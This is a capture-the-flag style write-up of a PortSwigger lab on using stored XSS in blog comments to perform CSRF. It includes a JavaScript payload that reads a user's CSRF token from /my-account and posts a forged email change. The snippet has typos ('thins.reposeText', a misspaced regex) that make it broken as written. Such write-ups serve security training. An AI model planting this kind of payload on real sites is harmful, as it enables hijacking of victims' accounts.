### Exploiting XSS to perform CSRF
                                                

### Lab description:-
 ![img](https://github.com/Mostafa-Mokthar/Writeups/blob/main/Web_Pentesting/PotrtSwigger/Exploiting%20XSS%20to%20perform%20CSRF/img/description.png)

### Introduction
 - **Stored XSS**, also known as persistent XSS which occurs when a malicious script is injected directly into a vulnerable web application. 
 - **Cross-site request forgery (also known as CSRF)** is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

### Steps:

- let's start with check the blog comments to know how to exploit XSS at it by typing darsh'"< > to show if it will accept these quotes and brackets or not ?!

![](https://github.com/Mostafa-Mokthar/Writeups/blob/main/Web_Pentesting/PotrtSwigger/Exploiting%20XSS%20to%20perform%20CSRF/img/check.png)

![](https://github.com/Mostafa-Mokthar/Writeups/blob/main/Web_Pentesting/PotrtSwigger/Exploiting%20XSS%20to%20perform%20CSRF/img/darsh.png)

  as we see in the source page in last figure they are printed as they are written, *so we can write any script in the comment*. 
 
 - 2nd step is to login using given user name and password and update the email with to be attacker@gmail.com

 ![](https://github.com/Mostafa-Mokthar/Writeups/blob/main/Web_Pentesting/PotrtSwigger/Exploiting%20XSS%20to%20perform%20CSRF/img/login.png) 
 
 ![](email.png)
 
 - 3rd step is to go to the burpsuite to see the request sent when we update the email 
 
 ![](https://github.com/Mostafa-Mokthar/Writeups/blob/main/Web_Pentesting/PotrtSwigger/Exploiting%20XSS%20to%20perform%20CSRF/img/email.png)
 
     and as we see the request send the email and csrf in the request.
 
 - *the most important step is how we can use XSS to peform CSRF and change the user email by any email we want*
     we need to write scipt in comment page which send get request to account page to take the CSRf from it and send it with email we want ( i use darsh@gmail.com)
     to update the user email with this email.
     
    ```js:<script>
    var request = new XMLHttpRequest() ;
    request.onreadystatechange = changeEmail;
    request.open("get","/my-account",true)
    request.send() ; 
    function changeEmail(){
      var token = thins.reposeText.match(/name ="csrf" value= "(\w+)"/)[1] ;
      var change = new XMLHttpRequest();
      change.open("post","/my-account/change-email",true);
      change.send("email=darsh@gmail.com&csrf="+token) ;

    }

</script>
 
   ** This script send get request to account page to take the CSRf from it and send it with email we want (darsh@gmail.com)
    (post req)to update the user email with this email and then put it as a comment in blog comments page **
    
    ![](https://github.com/Mostafa-Mokthar/Writeups/blob/main/Web_Pentesting/PotrtSwigger/Exploiting%20XSS%20to%20perform%20CSRF/img/comment.png)
   
   after that if we return to account page we see that the email changed successfuly.
   
   ![](https://github.com/Mostafa-Mokthar/Writeups/blob/main/Web_Pentesting/PotrtSwigger/Exploiting%20XSS%20to%20perform%20CSRF/img/done.png)
   
